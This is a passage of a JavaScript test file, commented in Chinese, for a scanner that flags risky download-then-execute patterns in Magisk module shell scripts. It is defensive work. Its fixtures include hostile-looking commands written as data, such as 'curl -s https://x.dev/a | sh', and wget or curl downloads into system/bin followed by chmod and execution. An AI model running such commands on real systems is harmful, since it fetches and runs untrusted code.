  //   84 '        curl)    command -v curl >/dev/null 2>&1 && bounded 90 curl -fsSL … -o "$2" "$3" 2>/dev/null ;;'
  //   85 '        wget)    command -v wget >/dev/null 2>&1 && bounded 90 wget -q -T 20 -O "$2" "$3" 2>/dev/null ;;'
  // 实验结论（工单 §2(c) 要的那句话）：**标签行本身不产生 sink** —— `curl)` 在词法层被 `)` 切成
  // 独立的段 [curl]，段里没有落盘选项，所以既不立 sink 也不立执行形态。
  const block = t31body(T31_SHEBANG,
    'run_engine() {',
    '    rm -f "$2"',
    '    case "$1" in',
    '        asfetch) [ -n "$ABI" ] && [ -f "$ASFETCH" ] && { [ -x "$ASFETCH" ] || chmod 0755 "$ASFETCH" 2>/dev/null; } && bounded 90 "$ASFETCH" -T 15 -o "$2" "$3" 2>/dev/null ;;',
    '        bb)      [ -n "$BB" ] && bounded 90 "$BB" wget -q -T 20 -O "$2" "$3" 2>/dev/null ;;',
    '        curl)    command -v curl >/dev/null 2>&1 && bounded 90 curl -fsSL --connect-timeout 15 --speed-limit 1 --speed-time 20 --max-time 85 -o "$2" "$3" 2>/dev/null ;;',
    '        wget)    command -v wget >/dev/null 2>&1 && bounded 90 wget -q -T 20 -O "$2" "$3" 2>/dev/null ;;',
    '    esac',
    '    [ -s "$2" ]',
    '}');
  assert.deepEqual(t31dte(block), [], '整段逐字喂进去：0 条链');
  assert.deepEqual(t31mod(block), [], '整段逐字喂进去：0 条 DOWNLOAD_TO_MODULE_EXEC');
  // 活体检测（工单 §2(c)「自己做实验确认」那一步）：把 84 行的落盘目标换成可钉住的路径，
  // 标签 `curl)` 与 `command -v curl` 两处**仍然不许**被当成下载段。
  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
    '        curl)    command -v curl >/dev/null 2>&1 && bounded 90 curl -fsSL --connect-timeout 15 -o /data/local/tmp/kb.bin "$3" 2>/dev/null ;;',
    'sh /data/local/tmp/kb.bin')), [],
    '把 sink 换成可钉路径后仍是 0 ⇒ 立不住的原因在命令位，标签与探测位没被当成下载段');
  // 反面对照：同一形状但下载器**站在**命令位上 —— 证明上面那个 0 是判据在筛，不是规则没看见
  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
    '        curl)    curl -fsSL -o /data/local/tmp/kb.bin "$3" 2>/dev/null ;;',
    'sh /data/local/tmp/kb.bin')), ['3/high'], '标签后面紧跟真下载段时这条规则是看得见的');
});

test('T3.1-C2 反向（逐字 Integrity-Box webroot/UpdateTranslation.sh:54-58）：case 标签 curl) 与下载行分处两个逻辑行时不叠加', () => {
  // Integrity-Box/webroot/UpdateTranslation.sh:54-58（逐字：55 行是标签，56 行的命令位是 "$DOWNLOADER"）
  const t = t31body(T31_SHEBANG,
    '    case "$DL_MODE" in',
    '        curl)',
    '            "$DOWNLOADER" -L --fail --connect-timeout 15 --max-time 180 -o "$ZIP_PATH.tmp" "$URL" 2>/dev/null',
    '            rc=$?',
    '            ;;',
    'sh "/storage/emulated/0/Download/IntegrityModules/Canary.zip.tmp"');
  assert.deepEqual(t31dte(t), [], '标签行不立 sink，下载行的命令位是 $DOWNLOADER ⇒ 两处都不认（工单 §2(b)/(c)）');
});

// —— §3 新增第二格 DOWNLOAD_TO_MODULE_EXEC ——

test('T3.1-D1 正面（逐字 tree customize.sh:37/38/41/43）：远程内容落进模块 system/ 并被加执行位', async () => {
  // Magisk-Modules-Alt-Repo/tree customize.sh:37 '    url="https://raw.githubusercontent.com/Magisk-Modules-Alt-Repo/mkshrc/master/common/bash/$bash_binary"'
  // 同文件:38 '    wget -qO "$MODPATH/system/bin/bash" "$url"'
  // 同文件:41 '    if [ $? -eq 0 ] && [ -f "$MODPATH/system/bin/bash" ]; then'
  // 同文件:43 '        chmod 0755 "$MODPATH/system/bin/bash"'
  const r = await t3scan('eval.t31d', t3body(T3_SHEBANG,
    '    url="https://raw.githubusercontent.com/Magisk-Modules-Alt-Repo/mkshrc/master/common/bash/$bash_binary"',
    '    wget -qO "$MODPATH/system/bin/bash" "$url"',
    '    if [ $? -eq 0 ] && [ -f "$MODPATH/system/bin/bash" ]; then',
    '        ui_print " => Download successful."',
    '        chmod 0755 "$MODPATH/system/bin/bash"'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_TO_MODULE_EXEC'), ['service.sh:6/high'], '报在加执行位那一行');
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block', 'tree 今天就是 low/auto-approve —— 这一格闭的就是它');
  const [f] = r.findings.filter((x) => x.ruleId === 'DOWNLOAD_TO_MODULE_EXEC');
  assert.match(f.snippet, /wget -qO "\$MODPATH\/system\/bin\/bash"/, '落地行的证据要在');
  assert.match(f.snippet, /chmod 0755 "\$MODPATH\/system\/bin\/bash"/, '加执行位那一行的证据也要在');
  assert.equal(f.message, RULES_BY_ID.DOWNLOAD_TO_MODULE_EXEC.title, 'message 取自己的 title');
  assert.notEqual(f.message, RULES_BY_ID.DOWNLOAD_THEN_EXEC.title,
    '「远程内容被拿去执行」与「写进系统分区位置并加成可执行」是两个不同的主张（§2.7 文案纪律）');
});

test('T3.1-D2 反向：tree 若只下载不 chmod ⇒ 两个条件缺一个 ⇒ 不报', () => {
  const t = t31body(T31_SHEBANG,
    '    url="https://raw.githubusercontent.com/Magisk-Modules-Alt-Repo/mkshrc/master/common/bash/$bash_binary"',
    '    wget -qO "$MODPATH/system/bin/bash" "$url"',
    '    if [ $? -eq 0 ] && [ -f "$MODPATH/system/bin/bash" ]; then',
    '        ui_print " => Download successful."');
  assert.deepEqual(t31mod(t), [], '缺 chmod 那一半：不报（工单 §3 反向夹具第 1 条）');
  assert.deepEqual(t31dte(t), [], '也没有执行形态：DOWNLOAD_THEN_EXEC 同样不报');
});

test('T3.1-D3 反向：/data/local/tmp + chmod 700 不报（T3.9 那一格的方向不许变，它不在模块 system/ 下）', () => {
  const t = t31body(T31_SHEBANG,
    'curl -s https://x.dev/u -o /data/local/tmp/u',
    'chmod 700 /data/local/tmp/u');
  assert.deepEqual(t31mod(t), [], '工单 §3 反向夹具第 2 条 = 上一轮 T3.9：落地位置不在模块里 ⇒ 不报');
  assert.deepEqual(t31dte(t), [], '只有 chmod 没有执行：老口径一字未动');
});

test('T3.1-D4 反向：$MODPATH/data.json + chmod 644（没有执行位）与 curl -sLo 相对路径都不报', () => {
  assert.deepEqual(t31mod(t31body(T31_SHEBANG,
    'curl -s https://x.dev/cfg.json -o "$MODPATH/data.json"',
    'chmod 644 "$MODPATH/data.json"')), [], '工单 §3 反向夹具第 3 条：没有执行位 + 不在 system/ 下，两半都不满足');
  assert.deepEqual(t31mod(t31body(T31_SHEBANG,
    '        curl -sLo beszel-agent-update.tar.gz "$url" 2>/dev/null',
    'chmod 0755 beszel-agent-update.tar.gz')), [], '工单 §3 反向夹具第 4 条：相对路径不在模块 system/ 下 ⇒ 不报');
  // 这条是 §3「执行位」那一半的活体检测：工单列的四条反向夹具每条都**同时**缺两个条件，
  // 摘掉「执行位」那一半时它们不会变红（见报告 §7 的变异记录），所以补这一条 ——
  // 路径在模块 system/ 下、chmod 却不带执行位。
  assert.deepEqual(t31mod(t31body(T31_SHEBANG,
    '    wget -qO "$MODPATH/system/etc/rsconf.conf" "$url"',
    '    chmod 644 "$MODPATH/system/etc/rsconf.conf"')), [], '644 这一族没有执行位 ⇒ 不报（变异 (3) 红在这儿）');
});

test('T3.1-D5 写法面：执行位那一半只认加 x 的写法；落地位置那一半只认模块安装可见位置', () => {
  const modPath = '"$MODPATH/system/bin/tool"';
  // 加执行位的写法（工单 §3 点名的这一族）⇒ 报
  for (const mode of ['+x', 'u+x', 'a+x', '0755', '755', '0700', '700', '750']) {
    assert.deepEqual(t31mod(t31body(T31_SHEBANG,
      `    wget -qO ${modPath} "$url"`,
      `    chmod ${mode} ${modPath}`)), ['3/high'], `加执行位应当说话：chmod ${mode}`);
  }
  // 不加执行位的写法 ⇒ 不报
  for (const mode of ['644', '0644', '600', '440', 'a-w', 'u-wx', '-x', 'go-w']) {
    assert.deepEqual(t31mod(t31body(T31_SHEBANG,
      `    wget -qO ${modPath} "$url"`,
      `    chmod ${mode} ${modPath}`)), [], `没有执行位不该说话：chmod ${mode}`);
  }
  // 落地位置的模块写法都折算到同一个模块相对路径 ⇒ 都报
  for (const p of ['"$MODPATH/system/bin/tool"', '"$MODDIR/system/bin/tool"',
    '"${MODPATH}/system/bin/tool"', '"${MODDIR}/system/bin/tool"',
    '"/data/adb/modules/some.id/system/bin/tool"']) {
    assert.deepEqual(t31mod(t31body(T31_SHEBANG,
      `    wget -qO ${p} "$url"`,
      `    chmod 0755 ${p}`)), ['3/high'], `模块安装可见位置：${p}`);
  }
  // 不在安装可见位置 ⇒ 不报（模块根本身、模块里的普通目录、模块外的 service.d、临时目录）
  for (const p of ['"$MODPATH/tool"', '"$MODPATH/update-binary"', '"$MODPATH/system.prop"',
    '"$MODPATH/data/tool"', '"$MODPATH/service"', '"/data/adb/service.d/tool.sh"',
    '"/data/adb/su/tool"', '"/dev/null"']) {
    assert.deepEqual(t31mod(t31body(T31_SHEBANG,
      `    wget -qO ${p} "$url"`,
      `    chmod 0755 ${p}`)), [], `不在 system/ 也不是 $MODPATH/service.d/ 之下：${p}`);
  }
  // service.d/ 只认模块目录直接拼出的那一种（工单 §3 的原话），三种写法都要认
  for (const p of ['"$MODPATH/service.d/boot.sh"', '"$MODDIR/service.d/boot.sh"',
    '"${MODPATH}/service.d/boot.sh"']) {
    assert.deepEqual(t31mod(t31body(T31_SHEBANG,
      `    wget -qO ${p} "$url"`,
      `    chmod 0755 ${p}`)), ['3/high'], `$MODPATH 直接拼出的 service.d/：${p}`);
  }
  // chmod 的 mode 与路径之间夹 `--` 分隔符时也要认出路径
  assert.deepEqual(t31mod(t31body(T31_SHEBANG,
    '    wget -qO "$MODPATH/system/bin/tool" "$url"',
    '    chmod 0755 -- "$MODPATH/system/bin/tool"')), ['3/high'], '带 -- 分隔符的 chmod 也要说话');
});

test('T3.1-D6 反向：加执行位早于落地 ⇒ 不报（顺序判据与老规则同向）', () => {
  const t = t31body(T31_SHEBANG,
    '    chmod 0755 "$MODPATH/system/bin/bash"',
    '    wget -qO "$MODPATH/system/bin/bash" "$url"');
  assert.deepEqual(t31mod(t), [], '「先落地、后加执行位」才是这条规则说的话');
});

test('T3.1-D7 共存与上限：与 DOWNLOAD_THEN_EXEC 各说一件事，同一 sink 只报一次，每文件 ≤20', () => {
  const both = t31body(T31_SHEBANG,
    '    wget -qO "$MODPATH/system/bin/bash" "$url"',
    '    chmod 0755 "$MODPATH/system/bin/bash"',
    '    sh "$MODPATH/system/bin/bash" -c true');
  assert.deepEqual(t31mod(both), ['3/high'], '新规则报在加执行位那一行');
  assert.deepEqual(t31dte(both), ['4/high'], '老规则报在执行那一行：两条都在，不许互相吞');
  const many = [T31_SHEBANG];
  for (let i = 1; i <= 25; i++) {
    many.push(`    wget -qO "$MODPATH/system/bin/b${i}" "$url"`);
    many.push(`    chmod 0755 "$MODPATH/system/bin/b${i}"`);
  }
  assert.equal(hits('DOWNLOAD_TO_MODULE_EXEC', many.join('\n') + '\n').length, 20,
    '每文件每规则的上限与工厂同值（20），基数是链不是行数');
});

test('T3.1-D8 规则自身形状：新 id 进表、category/severity/pattern/anchor 与同族一致，文案不合并', () => {
  const rule = RULES_BY_ID.DOWNLOAD_TO_MODULE_EXEC;
  assert.ok(rule, 'DOWNLOAD_TO_MODULE_EXEC 必须进 RULES_BY_ID');
  assert.ok(CONTENT_RULES.includes(rule), '不进 CONTENT_RULES 的话 scanContent 根本不会跑它');
  assert.equal(rule.severity, 'high');
  assert.equal(rule.category, 'execution', '不许新造 category');
  assert.equal(rule.anchor, 'anywhere');
  assert.equal(rule.anchorSibling, null);
  assert.equal(rule.pattern, null, '跨行规则的匹配不住在单个正则上');
  assert.ok(rule.title && rule.advice);
  assert.notEqual(rule.title, RULES_BY_ID.DOWNLOAD_THEN_EXEC.title,
    '两个不同的主张不许共用一句标题');
  assert.notEqual(rule.advice, RULES_BY_ID.DOWNLOAD_THEN_EXEC.advice, 'advice 也各自单独写');
  const h = rule.scan('service.sh', t31body(T31_SHEBANG,
    '    wget -qO "$MODPATH/system/bin/bash" "$url"',
    '    chmod 0755 "$MODPATH/system/bin/bash"'));
  assert.equal(h.length, 1, JSON.stringify(h));
  assert.deepEqual(Object.keys(h[0]).sort(),
    ['advice', 'category', 'file', 'line', 'message', 'ruleId', 'severity', 'snippet'].sort(),
    'Finding 字段与工厂逐一对齐');
  assert.equal(h[0].message, rule.title);
  assert.equal(h[0].ruleId, 'DOWNLOAD_TO_MODULE_EXEC');
  assert.equal(h[0].file, 'service.sh');
  assert.ok(!/\s\s/.test(h[0].snippet), `snippet 必须由 trimSnippet 压平：${JSON.stringify(h[0].snippet)}`);
  assert.equal(JSON.stringify(rule.scan('x.sh', h[0].snippet)), JSON.stringify(rule.scan('x.sh', h[0].snippet)),
    '纯函数：同输入两次逐字节一致');
  assert.equal(typeof redactText(t31body(T31_SHEBANG,
    '    wget -qO "$MODPATH/system/bin/bash" "$url"')), 'string', '脱敏通道不许因为 pattern:null 崩掉');
});

test('T3.1-D9 老判据一字未动：DOWNLOAD_THEN_EXEC 的 severity/category/pattern/anchor 与跨文件、让位口径都不变', () => {
  const rule = RULES_BY_ID.DOWNLOAD_THEN_EXEC;
  assert.equal(rule.severity, 'high');
  assert.equal(rule.category, 'execution');
  assert.equal(rule.pattern, null);
  assert.equal(rule.anchor, 'anywhere');
  assert.ok(rule.title && rule.advice);
  // 跨文件仍然不报（本轮没有新增跨文件能力）
  const one = hits('DOWNLOAD_THEN_EXEC', t31body(T31_SHEBANG, 'wget -qO /data/local/tmp/u "$url"'), 'install.sh');
  const other = hits('DOWNLOAD_THEN_EXEC', t31body(T31_SHEBANG, 'sh /data/local/tmp/u'), 'service.sh');
  assert.deepEqual(one.map((f) => f.line), [], 'install.sh 只下载');
  assert.deepEqual(other.map((f) => f.line), [], 'service.sh 只执行：本规则看不到 install.sh 的 sink');
  // 新规则同样只吃单篇文本
  assert.deepEqual(t31mod(t31body(T31_SHEBANG, '    wget -qO "$MODPATH/system/bin/bash" "$url"'), 'install.sh'), [],
    '只有落地、没有同篇文本里的加执行位 ⇒ 不报');
  // 管道那一行仍然只归 PIPE_TO_SHELL：本轮没动让位规则
  assert.deepEqual(hits('PIPE_TO_SHELL', t31body(T31_SHEBANG, 'curl -s https://x.dev/a | sh')).map((f) => f.line), [2]);
  assert.deepEqual(t31dte(t31body(T31_SHEBANG, 'curl -s https://x.dev/a | sh')), []);
});

// ===========================================================================
// Task 3.2 —— 命令位要跳过 shell 控制词：挡住真链的是 `if`，不是写法
// ===========================================================================
//
// 上一轮（T3.1）把 DOWNLOAD_THEN_EXEC 的写法面做完之后，sensitive-props 那条真链仍然 0 命中，
// 唯一原因是 sink 行与执行行的命令位都是控制词 `if`（报告 §9.1 / 夹具 T3.1-A5 记录的就是这一格）。
// 本轮只动共享层那一个函数 `logicalFirstToken`：命令位 = 逻辑行里**第一个不是 shell 控制词**的分词。
// 控制词表只有这一份，规则里**不许**再写第二份「跳过 if」的局部逻辑 —— fix6-F1 那条病就是这么来的。
//
// 下面每一条正向夹具的原文都逐字取自 `fp-t3/zips/sensitive-props-main-source.zip`
// （静态读，包内没有一行代码被执行过）：
//   sensitive-props-main/customize.sh:207/208/215/216
//   sensitive-props-main/action.sh:210/211/218/219
//   sensitive-props-main/customize.sh:212 = '    fi'（整行只有控制词那一格）

// —— §2.3 正向：同一条链，前缀换一个控制词 ——

/** 逐字 customize.sh 那四行（207/208/215/216），把两处行首的 `if` 换成 prefix。 */
const T32_C = [
  '    if wget -qO "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null || \\',
  '       curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null; then',
  '      chmod 755 "$MODPATH/resetprop-rs"',
  '      if "$MODPATH/resetprop-rs" -h >/dev/null 2>&1; then'];
/** 逐字 action.sh 那四行（210/211/218/219），同上。 */
const T32_A = [
  '      if wget -qO "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null || \\',
  '         curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null; then',
  '        chmod 755 "$MODPATH/resetprop-rs"',
  '        if "$MODPATH/resetprop-rs" -h >/dev/null 2>&1; then'];
const t32chain = (prefix, base = T32_C) =>
  t31body(T31_SHEBANG, ...base.map((l) => l.replace(/^(\s*)if(?=\s)/, `$1${prefix}`)));
/** 逻辑行 head 那一行的命令位（共享层说话，夹具不自己数第一个词）。 */
const t32cmd = (text, line) => {
  const ctx = buildLineContexts(text.split('\n'));
  return ctx[line - 1] ? ctx[line - 1].firstToken : undefined;
};

test('T3.2-A1 正向（逐字 sensitive-props customize.sh 207/208/215/216 原样）：`if` 站在命令位上时链照样说话', () => {
  const t = t32chain('if');
  assert.deepEqual(t31dte(t), ['5/high'],
    '落点必须是 216 那一行（夹具里的第 5 行，执行行），不是 sink 行');
  const [f] = hits('DOWNLOAD_THEN_EXEC', t);
  assert.equal(f.ruleId, 'DOWNLOAD_THEN_EXEC');
  assert.equal(f.severity, 'high');
  // sink 那一半仍然由 208 那半句 `curl -sLo` 立：207 的段首是 `if`，穿透控制词不动 dteCollectSinks 的段口径
  assert.match(f.snippet, /curl -sLo "\$MODPATH\/resetprop-rs"/, 'snippet 必须带 208 那半句逐字原文');
  assert.match(f.snippet, /chmod 755 "\$MODPATH\/resetprop-rs"/, '215 的 chmod 仍是同一条链的证据');
  // 落点那一行的逐字原文也在 snippet 里（链的三段用 `->` 串起来；整段受 MAX_SNIPPET=160 截断，
  // 所以这里匹配的是 `-> if "$MODPATH/resetprop-rs"` 这一截，不是整行）
  assert.match(f.snippet, /-> if "\$MODPATH\/resetprop-rs"/, '216 的逐字原文（含行首那个 if）必须在 snippet 里');
  // 同一个包的另一篇文本：action.sh 210/211/218/219 —— 真包上一轮实测的另半条链
  assert.deepEqual(t31dte(t32chain('if', T32_A), 'action.sh'), ['5/high'],
    'action.sh:219 那一格同理（真包差集里的第二条）');
  assert.deepEqual(t31mod(t), [], 'resetprop-rs 不在模块 system/ 下 ⇒ 另一条规则仍不报（判据互不借用）');
});

test('T3.2-A2 正向：`while` 站在命令位上 ⇒ 同一条链命中，落点不变', () => {
  assert.deepEqual(t31dte(t32chain('while')), ['5/high'], 'while 前缀的那条链必须与 if 同判');
  assert.equal(t32cmd(t32chain('while'), 2), 'wget', '命令位由共享层说话：跳过 while 之后是 wget');
});

test('T3.2-A3 正向：`time` 站在命令位上 ⇒ 同一条链命中，落点不变', () => {
  assert.deepEqual(t31dte(t32chain('time')), ['5/high'],
    'time 会把它的第一个参数拿去跑，这一格本来就不该沉默');
  assert.equal(t32cmd(t32chain('time'), 5), '$MODPATH/resetprop-rs', '执行行的命令位是那条路径');
});

test('T3.2-A4 正向：`!` 站在命令位上 ⇒ 同一条链命中，落点不变', () => {
  assert.deepEqual(t31dte(t32chain('!')), ['5/high'], '! 是否定前导词，它后面的词才是命令');
  assert.equal(t32cmd(t32chain('!'), 2), 'wget', '跳过 ! 之后命令位是 wget');
});

test('T3.2-A5 正向：控制词表剩下的每一格都必须穿透（until/for/then/else/do/{）', () => {
  for (const prefix of ['until', 'for', 'then', 'else', 'do', '{']) {
    assert.deepEqual(t31dte(t32chain(prefix)), ['5/high'], `控制词 ${prefix} 站在命令位上时这条链必须说话`);
  }
});

// —— §2.3 那条「现在就命中」的形状：命令替换形态钉成回归哨兵 ——

test('T3.2-B1 回归哨兵（不对称的另一半）：R=$(wget -qO …) 这一格改前改后都命中，命令位仍是 R=$(wget', () => {
  // `(` 本来就是语句边界符（DTE_SEP），所以命令替换里的 wget 早就站在自己的段首上 ——
  // 这一格与本轮的控制词表**无关**，它的职责是：将来谁动了边界符处理，这里当场变红。
  const t = t31body(T31_SHEBANG,
    'R=$(wget -qO "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET")',
    '      chmod 755 "$MODPATH/resetprop-rs"',
    '"$MODPATH/resetprop-rs" -h');
  assert.deepEqual(t31dte(t), ['4/high'], '命令替换形态：sink 由段首的 wget 立，执行行是第 4 行');
  assert.equal(t32cmd(t, 2), 'R=$(wget',
    '控制词表不许把赋值前缀吃掉：`R=$(wget` 不是控制词，命令位就是它自己（穿透只发生在真正的控制词上）');
});

// —— §2.3 反向夹具：整行只有控制词 ⇒ 命令位上没有任何东西 ——

test('T3.2-C1 反向：整行只有控制词（fi/done/}/then/else）的行不许被当成「有命令在命令位上」', () => {
  // sensitive-props-main/customize.sh:212 = '    fi'、action.sh:215 = '      fi'（逐字）
  for (const line of ['    fi', '      fi', 'done', '  done', '}', 'then', 'else', 'do', 'fi \\']) {
    const t = t31body(T31_SHEBANG, line);
    assert.equal(t32cmd(t, 2), '', `整行只有控制词 ⇒ 命令位是空的：${JSON.stringify(line)}`);
  }
  // 真包那一段原样：fi / done 那些行既不立 sink 也不立执行形态，链只有一条
  const real = t31body(T31_SHEBANG, T32_C[0], T32_C[1], '        _dl_ok=true', '    else',
    '      _dl_ok=false', '    fi', T32_C[2], T32_C[3], '    fi');
  assert.deepEqual(t31dte(real), ['9/high'], '插进真包的 else/fi 那些行之后，链还是只有原来那一条');
  assert.deepEqual(t31mod(real), [], '另一条规则同样不因为 fi/done 而行进');
});

test('T3.2-C2 反向：真正的命令词与控制词后面的**参数**都不许被跳掉（表只住控制词）', () => {
  const cases = [
    ['wget -qO /data/local/tmp/u https://x.dev/u', 'wget'],   // 下载动词自己站在命令位上：不许被当成控制词跳掉
    ['curl -sLo /data/local/tmp/v https://x.dev/v', 'curl'],
    ['chmod 755 "$MODPATH/resetprop-rs"', 'chmod'],            // M2（跳过一切动词）会把 chmod 吃掉 ⇒ 这里红
    ['sh /data/local/tmp/x', 'sh'],
    ['rm -rf \\', 'rm'],
    ['[ -f "$MODPATH/resetprop-rs" ] && [ -x "$MODPATH/resetprop-rs" ]', '['], // 测试位不是控制词
    ['if [ "$VOL_RESULT" = "up" ]; then', '['],                // 跳过 if 之后停在 [ —— 不再往后走
    ['if boolval "$_dl_ok"; then', 'boolval'],                 // 逐字 customize.sh:214：穿透 if 之后是那个函数名
    ['true && wget -qO /data/local/tmp/u "$url"', 'true'],      // && 之后的词归段首口径，不归命令位口径
    // 赋值前缀：命令位就是这一整段（既有口径只去**外层**引号，词中间的引号留着 —— 本轮没动它）
    ['RESETPROP_RS_URL="https://x.dev/y"', 'RESETPROP_RS_URL="https://x.dev/y'],
  ];
  for (const [line, want] of cases) {
    assert.equal(t32cmd(t31body(T31_SHEBANG, line), 2), want, `命令位应当停在 ${JSON.stringify(want)}：${line}`);
  }
});

test('T3.2-C3 反向：`if [ -f "$MODPATH/x" ]` 这类测试位不算执行（上一轮 §8.1 留的那个问题，本轮的答案是「不算」）', () => {
  // 控制词表只收 shell 的**保留字**，`[`/`test` 不在表里 ⇒ 穿透 if 之后停在 `[` 上，
  // 而 `[` 既不是下载器也不是路径，所以测试位里的 sink 与执行目标都不成立。
  const t = t31body(T31_SHEBANG,
    '       curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null',
    '      if [ -f "$MODPATH/resetprop-rs" ] && [ -x "$MODPATH/resetprop-rs" ]; then',
    '        ui_print "- ok"');
  assert.deepEqual(t31dte(t), [], '测试位里的同一条路径不许被执行形态说话：本轮没有把 [ 当控制词');
  assert.equal(t32cmd(t, 3), '[', '穿透 if 之后停在 [ —— 这就是「测试位不算执行」的所在线');
  assert.deepEqual(t31mod(t), [], '同理另一条规则也不报');
});

test('T3.2-D1 形状：控制词表只有一张 —— T3.3 起它被两处读（命令位 + 共享层左边界）', () => {
  // 本轮的存在理由：`logicalFirstToken` 是命令位的唯一口径。DOWNLOAD_THEN_EXEC /
  // DOWNLOAD_TO_MODULE_EXEC 里不许出现「跳过 if」那种局部逻辑，否则就是 fix6-F1 的病复发。
  //
  // T3.3 的放宽（工单 §2）：**读点**从 1 处改成 2 处 —— 第二处是 PIPE_TO_SHELL 的左边界，
  // 它必须读同一张表、不许抄一份。表本身仍然只许有一张（下面两条新增断言钉着）。
  const src = readFileSync(new URL('./risk-rules.mjs', import.meta.url), 'utf8');
  const decl = /const SHELL_CONTROL_WORDS = new Set\(\[([^\]]*)\]\)/.exec(src);
  assert.ok(decl, '共享层必须有一张具名的控制词表（只改函数体不写表 = 判据没落地，也没有第二处可查）');
  const words = decl[1].split(',').map((s) => s.trim().replace(/^'|'$/g, '')).filter(Boolean).sort();
  // 工单 §1 那 15 个 + T3.3 §2 补的 `elif`（POSIX 保留字，`elif curl … | sh` 与 if 那一族同一个写法）。
  // **补 elif 必须与这张逐字清单同时改** —— 少改任何一边都当场红（工单 §2 说这是设计好的，不许绕）。
  assert.deepEqual(words, ['!', '{', '}', 'case', 'do', 'done', 'elif', 'else', 'fi', 'for', 'if', 'select', 'then', 'time', 'until', 'while'].sort(),
    '表的内容必须逐字等于工单 §1 给的那一张 + T3.3 补的 elif：一格不多（`[`/`test`/`&&`/`exec`/`esac`/`in` 没收），一格不少');
  // 读点恰好两处：命令位用 `.has(` 逐词判；左边界要把整张表展开成正则分支（`.has(` 在正则构造里拿不到词表，
  // 所以第二处读的是集合本身 —— 工单 §2 把这一处写成「`.has(` 从 1 改 2」，这里按实现的两类读法分开钉，
  // 合计仍然是 2 处，且比原文更强：既拦「又加一处读」，也拦「把词表抄进 pattern」。
  const hasReads = (src.match(/SHELL_CONTROL_WORDS\.has\(/g) || []).length;
  const spreadReads = (src.match(/\[\.\.\.SHELL_CONTROL_WORDS\]|\bfrom\(SHELL_CONTROL_WORDS\)/g) || []).length;
  assert.equal(hasReads, 1, '命令位那一处读必须还是 `.has(`（逻辑行那一个函数）');
  assert.equal(spreadReads, 1, '左边界那一处读必须是**展开整张表**，不是把词表抄进 pattern');
  assert.equal(hasReads + spreadReads, 2, '工单 §2：读点从 1 处改成 2 处 —— 第三处读就是又一个口径');
  assert.equal((src.match(/const SHELL_CONTROL_WORDS = new Set\(/g) || []).length, 1, '这张表只许声明一次');
  // 新增断言①（工单 §2）：源码里不许出现**第二张具名控制词表**。
  // 判据按「那张 Set 的字面量里含 ≥2 个控制词」算，所以 DTE_TOOLS / DTE_EXEC_VERBS / ARG_ONLY_VERB
  // 这些同层表不会被误算（它们一格控制词都没有）。
  const tablesWithControlWords = [...src.matchAll(/const\s+([A-Za-z0-9_]+)\s*=\s*new Set\(\[([\s\S]*?)\]\)/g)]
    .filter((m) => m[2].split(',').map((s) => s.trim().replace(/^'|'$/g, '')).filter((t) => words.includes(t)).length >= 2)
    .map((m) => m[1]);
  assert.deepEqual(tablesWithControlWords, ['SHELL_CONTROL_WORDS'],
    `含控制词的具名 Set 只许有一张，实际：${JSON.stringify(tablesWithControlWords)} —— 两张各自演化就是 fix6-F1 的病`);
});

test('T3.2-D2 让位与顺序判据一字未动：执行行必须晚于落地行，路径仍要求精确相等', () => {
  // 同一条链把执行行放到 sink 之前 ⇒ 仍然不报（本轮只动命令位，没动顺序判据）
  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
    '      if "$MODPATH/resetprop-rs" -h >/dev/null 2>&1; then',
    '       curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null; then')), [],
    '执行早于落地 ⇒ 不是这条链：顺序判据没松');
  // 路径差一个尾段 ⇒ 不报（精确相等没松）
  assert.deepEqual(t31dte(t31body(T31_SHEBANG, T32_C[0], T32_C[1], T32_C[2],
    '      if "$MODPATH/resetprop-rsx" -h >/dev/null 2>&1; then')), [], '路径不相等就不是同一条链');
  // 标准输出继续不立 sink：穿透 if 之后，执行行确实站到了命令位上，但 sink 那一半还是不存在
  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
    'wget -qO- /data/local/tmp/u https://x.dev/u',
    'if /data/local/tmp/u -h; then')), [], '-qO- 是标准输出：命令位穿透不许把它变成落盘');
  // 让位口径没变：管道那一行仍然只归 PIPE_TO_SHELL，本规则不抢
  assert.deepEqual(t31dte(t31body(T31_SHEBANG, 'if curl -s https://x.dev/a | sh')), []);
  // 观察（T3.2 那一轮记下的限度，**T3.3 已经闭上它**）：PIPE_TO_SHELL 的左边界原来只认 `^` 与 `[|;&`(]`，
  // 于是 `if curl … | sh` 这种**控制词前缀**的管道在 main 上是 low/auto-approve（task-3.2-report.md §4 那张表）。
  // 本轮把左边界扩成「行首 | 语句边界符后 | 控制词 + 空白后」，这一格从 0 命中变成命中 —— 下面两条是它的回归哨兵，
  // 正面逐形夹具见 T3.3-A1/A2。
  assert.deepEqual(hits('PIPE_TO_SHELL', t31body(T31_SHEBANG, 'if curl -s https://x.dev/a | sh')).map((f) => f.line), [2],
    'T3.3 闭上的是这一格：改前的实际值是 []（工单 §0 复现表第 2 行）');
  assert.deepEqual(hits('PIPE_TO_SHELL', t31body(T31_SHEBANG, 'curl -s https://x.dev/a | sh')).map((f) => f.line), [2],
    '没有控制词前缀时它照旧命中：上面那一格不是把既有口径改松了才「多出来」的');
});

test('T3.2-D3 继续不修的两格：$DOWNLOADER 与 bounded "$BB" wget，前缀换成控制词之后仍然不立 sink', () => {
  // 工单 §3：这两格本轮继续不修。这里加**控制词前缀**，证明命令位穿透没有顺手把它们做掉。
  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
    '    DOWNLOADER=$(command -v curl); DL_MODE="curl"; return',
